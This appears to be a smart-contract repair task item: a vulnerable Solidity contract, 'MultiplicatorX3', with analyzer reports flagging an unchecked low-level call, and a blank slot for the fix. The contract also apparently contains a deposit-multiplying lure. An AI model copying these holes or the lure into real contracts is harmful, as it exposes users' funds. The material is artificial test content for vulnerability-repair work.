@@ -1,0 +1,43 @@
+/// Your task is to repair the following Solidity Smart Contract
+pragma solidity ^0.4.18;
+
+contract MultiplicatorX3 {
+    address public Owner = msg.sender;
+
+    function() public payable {}
+
+    function withdraw() public payable {
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
+    }
+
+    function Command(address adr, bytes data) public payable {
+        require(msg.sender == Owner);
+
+        adr.call.value(msg.value)(data);
+    }
+
+    function multiplicate(address adr) public payable {
+        if (msg.value >= this.balance) {
+            adr.transfer(this.balance + msg.value);
+        }
+    }
+}
+
+/// This Solidity Smart Contract has been analyzed by smart contract analyzers. Here are the results from these analyzers.
+
+/// 1. Smartcheck Analysis Results
+/// 1.1. Vulnerability: unchecked_low_level_calls at Line 16:
+        adr.call.value(msg.value)(data);
+
+
+/// 2. Mythril-0.23.15 Analysis Results
+/// 2.1. Vulnerability: unchecked_low_level_calls at Line 16:
+        adr.call.value(msg.value)(data);
+///  Message:The return value of a message call is not checked.
+///   External calls return a boolean value. If the callee halts with an exception, 'false' is returned and execution continues in the caller. The caller should check whether an exception happened and react accordingly to avoid unexpected behavior. For example it is often desirable to wrap external calls in require() so the transaction is reverted if the call fails.
+///   Classification: SWC-104
+
+
+
+/// Repaired Solidity Smart Contract
